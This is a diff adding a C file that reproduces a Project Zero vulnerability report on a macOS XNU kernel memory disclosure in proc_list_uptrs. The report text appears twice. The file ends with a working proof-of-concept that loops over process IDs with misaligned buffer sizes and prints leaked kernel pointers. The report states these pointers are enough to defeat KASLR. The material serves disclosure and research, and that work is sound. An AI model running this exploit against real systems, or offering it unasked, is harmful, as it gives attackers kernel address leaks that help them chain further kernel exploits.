@@ -1,0 +1,235 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1372
+
+the kernel libproc API proc_list_uptrs has the following comment in it's userspace header:
+
+/*
+ * Enumerate potential userspace pointers embedded in kernel data structures.
+ * Currently inspects kqueues only.
+ *
+ * NOTE: returned "pointers" are opaque user-supplied values and thus not
+ * guaranteed to address valid objects or be pointers at all.
+ *
+ * Returns the number of pointers found (which may exceed buffersize), or -1 on
+ * failure and errno set appropriately.
+ 
+
+This is a recent addition to the kernel, presumably as a debugging tool to help enumerate
+places where the kernel is accidentally disclosing kernel pointers to userspace.
+
+The implementation currently enumerates kqueues and dumps a bunch of values from them.
+
+Here's the relevant code:
+
+// buffer and buffersize are attacker controlled
+
+int
+proc_pidlistuptrs(proc_t p, user_addr_t buffer, uint32_t buffersize, int32_t *retval)
+{
+  uint32_t count = 0;
+  int error = 0;
+  void *kbuf = NULL;
+  int32_t nuptrs = 0;
+
+  if (buffer != USER_ADDR_NULL) {
+    count = buffersize / sizeof(uint64_t);     <---(a)
+    if (count > MAX_UPTRS) {
+      count = MAX_UPTRS;
+      buffersize = count * sizeof(uint64_t);
+    }
+    if (count > 0) {
+      kbuf = kalloc(buffersize);               <--- (b)
+      assert(kbuf != NULL);
+    }
+  } else {
+    buffersize = 0;
+  }
+
+  nuptrs = kevent_proc_copy_uptrs(p, kbuf, buffersize);
+
+  if (kbuf) {
+    size_t copysize;
+    if (os_mul_overflow(nuptrs, sizeof(uint64_t), &copysize)) {  <--- (c)
+      error = ERANGE;
+      goto out;
+    }
+    if (copysize > buffersize) {    <-- (d)
+      copysize = buffersize;
+    }
+    error = copyout(kbuf, buffer, copysize);  <--- (e)
+  }
+
+
+At (a) the attacker-supplied buffersize is divided by 8 to compute the maximum number of uint64_t's
+which can fit in there.
+
+If that value isn't huge then the attacker-supplied buffersize is used to kalloc the kbuf buffer at (b).
+
+kbuf and buffersize are then passed to kevent_proc_copy_uptrs. Looking at the implementation of
+kevent_proc_copy_uptrs the return value is the total number of values it found, even if that value is larger
+than the supplied buffer. If it finds more than will fit it keeps counting but no longer writes them to the kbuf.
+
+This means that at (c) the computed copysize value doesn't reflect how many values were actually written to kbuf
+but how many *could* have been written had the buffer been big enough.
+
+If there were possible values which could have been written than there was space in the buffer then at (d) copysize
+will be limited down to buffersize.
+
+Copysize is then used at (e) to copy the contents of kbuf to userspace.
+
+The bug is that there's no enforcement that (buffersize % 8) == 0. If we were to pass a buffersize of 15, at (a) count would be 1
+as 15 bytes is only enough to store 1 complete uint64_t. At (b) this would kalloc a buffer of 15 bytes.
+
+If the target pid actually had 10 possible values which kevent_proc_copy_uptrs finds then nuptrs will return 10 but it will
+only write to the first value to kbuf, leaving the last 7 bytes untouched.
+
+At (c) copysize will be computed at 10*8 = 80 bytes, at (d) since 80 > 15 copysize will be truncated back down to buffersize (15)
+and at (e) 15 bytes will be copied back to userspace even though only 8 were written to.
+
+Kalloc doesn't zero-initialise returned memory so this can be used to easily and safely disclose lots of kernel memory, albeit
+limited to the 7-least significant bytes of each 8-byte aligned qword. That's more than enough to easily defeat kaslr.
+
+This PoC demonstrates the disclosure of kernel pointers in the stale kalloc memory.
+
+Tested on MacOS 10.13 High Sierra (17A365)
+*/
+
+// ianbeer
+
+#if 0
+XNU kernel memory disclosure due to bug in kernel API for detecting kernel memory disclosures
+
+the kernel libproc API proc_list_uptrs has the following comment in it's userspace header:
+
+/*
+ * Enumerate potential userspace pointers embedded in kernel data structures.
+ * Currently inspects kqueues only.
+ *
+ * NOTE: returned "pointers" are opaque user-supplied values and thus not
+ * guaranteed to address valid objects or be pointers at all.
+ *
+ * Returns the number of pointers found (which may exceed buffersize), or -1 on
+ * failure and errno set appropriately.
+ */
+
+This is a recent addition to the kernel, presumably as a debugging tool to help enumerate
+places where the kernel is accidentally disclosing kernel pointers to userspace.
+
+The implementation currently enumerates kqueues and dumps a bunch of values from them.
+
+Here's the relevant code:
+
+// buffer and buffersize are attacker controlled
+
+int
+proc_pidlistuptrs(proc_t p, user_addr_t buffer, uint32_t buffersize, int32_t *retval)
+{
+	uint32_t count = 0;
+	int error = 0;
+	void *kbuf = NULL;
+	int32_t nuptrs = 0;
+
+	if (buffer != USER_ADDR_NULL) {
+		count = buffersize / sizeof(uint64_t);     <---(a)
+		if (count > MAX_UPTRS) {
+			count = MAX_UPTRS;
+			buffersize = count * sizeof(uint64_t);
+		}
+		if (count > 0) {
+			kbuf = kalloc(buffersize);               <--- (b)
+			assert(kbuf != NULL);
+		}
+	} else {
+		buffersize = 0;
+	}
+
+	nuptrs = kevent_proc_copy_uptrs(p, kbuf, buffersize);
+
+	if (kbuf) {
+		size_t copysize;
+		if (os_mul_overflow(nuptrs, sizeof(uint64_t), &copysize)) {  <--- (c)
+			error = ERANGE;
+			goto out;
+		}
+		if (copysize > buffersize) {    <-- (d)
+			copysize = buffersize;
+		}
+		error = copyout(kbuf, buffer, copysize);  <--- (e)
+	}
+
+
+At (a) the attacker-supplied buffersize is divided by 8 to compute the maximum number of uint64_t's
+which can fit in there.
+
+If that value isn't huge then the attacker-supplied buffersize is used to kalloc the kbuf buffer at (b).
+
+kbuf and buffersize are then passed to kevent_proc_copy_uptrs. Looking at the implementation of
+kevent_proc_copy_uptrs the return value is the total number of values it found, even if that value is larger
+than the supplied buffer. If it finds more than will fit it keeps counting but no longer writes them to the kbuf.
+
+This means that at (c) the computed copysize value doesn't reflect how many values were actually written to kbuf
+but how many *could* have been written had the buffer been big enough.
+
+If there were possible values which could have been written than there was space in the buffer then at (d) copysize
+will be limited down to buffersize.
+
+Copysize is then used at (e) to copy the contents of kbuf to userspace.
+
+The bug is that there's no enforcement that (buffersize % 8) == 0. If we were to pass a buffersize of 15, at (a) count would be 1
+as 15 bytes is only enough to store 1 complete uint64_t. At (b) this would kalloc a buffer of 15 bytes.
+
+If the target pid actually had 10 possible values which kevent_proc_copy_uptrs finds then nuptrs will return 10 but it will
+only write to the first value to kbuf, leaving the last 7 bytes untouched.
+
+At (c) copysize will be computed at 10*8 = 80 bytes, at (d) since 80 > 15 copysize will be truncated back down to buffersize (15)
+and at (e) 15 bytes will be copied back to userspace even though only 8 were written to.
+
+Kalloc doesn't zero-initialise returned memory so this can be used to easily and safely disclose lots of kernel memory, albeit
+limited to the 7-least significant bytes of each 8-byte aligned qword. That's more than enough to easily defeat kaslr.
+
+This PoC demonstrates the disclosure of kernel pointers in the stale kalloc memory.
+
+Tested on MacOS 10.13 High Sierra (17A365)
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+
+#define PRIVATE
+#include <libproc.h>
+
+uint64_t try_leak(pid_t pid, int count) {
+  size_t buf_size = (count*8)+7;
+  char* buf = calloc(buf_size+1, 1);
+
+  int err = proc_list_uptrs(pid, (void*)buf, buf_size);
+
+  if (err == -1) {
+    return 0;
+  }
+
+  // the last 7 bytes will contain the leaked data:
+  uint64_t last_val = ((uint64_t*)buf)[count]; // we added an extra zero byte in the calloc
+
+  return last_val;
+}
+
+int main(int argc, char** argv) {
+  for (int pid = 0; pid < 1000; pid++) {
+    for (int i = 0; i < 100; i++) {
+      uint64_t leak = try_leak(pid, i);
+      /*
+      if (leak != 0 && leak != 0x00adbeefdeadbeef) {
+        printf("%016llx\n", leak);
+      }
+      */
+      if ((leak & 0x00ffffff00000000) == 0xffff8000000000) {
+        printf("%016llx\n", leak);
+      }
+    }
+  }
+
+  return 0;
+}
